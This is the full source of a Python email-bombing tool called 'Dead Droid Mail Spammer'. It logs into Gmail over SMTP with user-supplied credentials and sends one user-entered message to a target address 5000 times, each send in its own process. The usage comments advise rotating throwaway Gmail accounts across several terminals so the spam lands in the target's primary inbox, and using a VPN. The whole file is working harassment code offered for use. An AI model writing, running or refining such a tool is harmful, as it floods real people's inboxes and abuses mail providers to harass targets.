import multiprocessing
from smtplib import SMTP
from email.message import EmailMessage
import threading
import blessed
import time
import sys, subprocess
import smtplib
import random

#<----------------USAGE--------------------->:
# Hi I'm Z3NTL3 and uhm... This only works for your GMAIL shit. 
# Dont forget to allow accessing for LOW SECURE Apps through your gmail account security settings, so it accepts this SMTP Connection
# Use GMAIL dummies, the spam is actually good
# Open this software in multiple terminals with multiple GMAIL Dummies
# Do not use the same GMAIL Dummies after you spammed someone's primaire Inbox!
# You have then to send spam from different gmail to spam in primaire box. Do not use gmail dummies twice for the same target/mail
# You can use the same GMAIL Dummies for an different target/mail
# Coded by Z3NTL3
#<------------------------------------------>:

term = blessed.Terminal()
underline = term.underline()
bold = term.bold()
reset = term.reset()
done = 'false'


d1 = term.color_rgb(5, 168, 255)
d2 = term.color_rgb(49, 178, 247)
d3 = term.color_rgb(80, 191, 250)
d4 = term.color_rgb(101, 197, 247)
d5 = term.color_rgb(129, 210, 252)
d6 = term.color_rgb(147, 215, 250)
d7 = term.color_rgb(228, 147, 250)
d8 = term.color_rgb(224, 130, 250)
d9 = term.color_rgb(215, 96, 247)
d10 = term.color_rgb(217, 83, 252)
d11 = term.color_rgb(209, 62, 247)
d12 = term.color_rgb(206, 45, 247)
d13 = term.color_rgb(255, 18, 223)


logo = f"""{d13}
 +--^----------,--------,-----,--------^-,
 | |||||||||   `--------'     |          O
 `+---------------------------^----------|
   `\_,---------,---------,--------------'
     / XXXXXX /'|       /'
    / XXXXXX /  `\    /'
   {d7}/ XXXXXX /`-------'
  {d8}/ XXXXXX /
  {d9}/ XXXXXX /   \033[0m       {d13}[{d11}*{d10}*{d9}* {d8}De{d7}ad{d6} D{d5}ro{d4}i{d3}d {d10}*{d11}*{d12}*{d13}]
 {d12}/ XXXXXX /    \033[0m{d7}-{d6}-{d1}> {d5}Cod{d4}e{d3}d {d2}by{d1} {d13}z3{d12}n{d11}tl{d10}3 {d13}- {d9}t.m{d8}e/{d7}z3{d6}nt{d5}l{d4}3 
{d11}(________(     \033[0m         {d13}[ {d7}Ma{d6}il{d5} Sp{d4}am{d3}m{d2}er {d13}]
 {d10}`------'\033[0m 

{d13}[{d12}*{d11}*{d10}*{d13}] {d2}Sp{d1}eed {d3}dep{d4}ende{d5}d {d6}on {d7}you{d8}r in{d9}ter{d10}net {d11}sp{d12}eed {d13}- {d1}Us{d2}e {d3}VP{d4}N{d5}! 

"""



def clear():
    subprocess.run('clear', shell=True , stderr=subprocess.DEVNULL)
    subprocess.run('cls', shell=True , stderr=subprocess.DEVNULL)


def detector():
    d = subprocess.getoutput("echo $TERM")

    while True:
        if d == "xterm-256color":
            break
        else:
            break
def main():
    try:
        mail = input(f'{d1}{d13}[{d12}M{d11}A{d10}I{d9}L{d13}]{d8}>{d7}>{d6}> {d13}')
        password = input(f'{d1}{d13}[{d12}P{d11}A{d10}S{d9}S{d13}]{d8}>{d7}>{d6}> {d13}' )
        message = input(f'{d1}{d13}[{d12}M{d11}ESS{d10}A{d9}GE{d13}]{d8}>{d7}>{d6}> {d13}')
        fromx = input(f'{d1}{d13}[{d12}F{d11}R{d10}O{d9}M{d13}]{d8}>{d7}>{d6}> {d13}')
        tox = input(f'{d1}{d13}[{d12}T{d11}o{d10}{d9}{d13}]{d8}>{d7}>{d6}> {d13}')
        print('\n\n')
        print(f'{d1}{d13}[{d12}S{d11}P{d10}A{d9}M-{d8}S{d7}ta{d6}rt{d5}e{d4}d{d13}]')
    except:
        clear()
        print(logo)
        print(f'{d13}[{d12}ER{d11}R{d10}O{d9}R{d13}]{d1}>{d2}>{d3}> {d4}W{d5}rong{d6} O{d7}p{d8}t{d9}on{d10}s {d8}Us{d7}ed {d6}Cont{d5}act {d4}t.m{d3}e/z3{d2}ntl3 {d1}for {d13}HELP\n\n')
        print(f'{d13}[{d12}R{d11}E{d10}ST{d9}ART{d13}]{d1}>{d2}>{d3}> {d4}I{d5}n 8{d6} se{d7}c{d8}on{d9}ds')
        time.sleep(8)
        main() 
    def r():
        try:
            a = ["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
            b = ["a","b","c","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",]
            c = ["1", "2","3", "4", "5", "6", "7", "8", "9", "10","+" , "!" , "?" ]
            randomdata = (random.choice(a + b + c))           
            datax = str(596459652149616497)   
            connect = SMTP('smtp.gmail.com' , 587)
            connect.starttls()
            connect.login(user=mail, password=password)
            
            msg = EmailMessage()
            msg['Subject'] = f"{datax}"
            msg['From'] = f"{fromx}"
            msg['To'] = f"{tox}"
            m = f"""{message}"""
            

            msg.set_content(m)    
            connect.send_message(msg)
        except:
            clear()
            print(logo)
            print(f'{d13}[{d12}ER{d11}R{d10}O{d9}R{d13}]{d1}>{d2}>{d3}> {d4}W{d5}rong{d6} O{d7}p{d8}t{d9}on{d10}s {d8}Us{d7}ed {d6}Cont{d5}act {d4}t.m{d3}e/z3{d2}ntl3 {d1}for {d13}HELP\n\n')
            print(f'{d13}[{d12}R{d11}E{d10}ST{d9}ART{d13}]{d1}>{d2}>{d3}> {d4}I{d5}n 8{d6} se{d7}c{d8}on{d9}ds')
            time.sleep(8)
            main() 
    try:
        for z3ntl3 in range(5000):
            thread = multiprocessing.Process(target=r)
            thread.start()
            thread.join()
    except:
        clear()
        print(logo)
        print(f'{d13}[{d12}ER{d11}R{d10}O{d9}R{d13}]{d1}>{d2}>{d3}> {d4}Th{d5}read{d6} E{d7}r{d8}r{d9}o{d10}r {d6}Cont{d5}act {d4}t.m{d3}e/z3{d2}ntl3 {d1}for {d13}HELP\n\n')
        print(f'{d13}[{d12}R{d11}E{d10}ST{d9}ART{d13}]{d1}>{d2}>{d3}> {d4}I{d5}n 8{d6} se{d7}c{d8}on{d9}ds')
        time.sleep(8)
        main() 
      
if __name__ == '__main__':
    detector()
    print(logo)
    main()
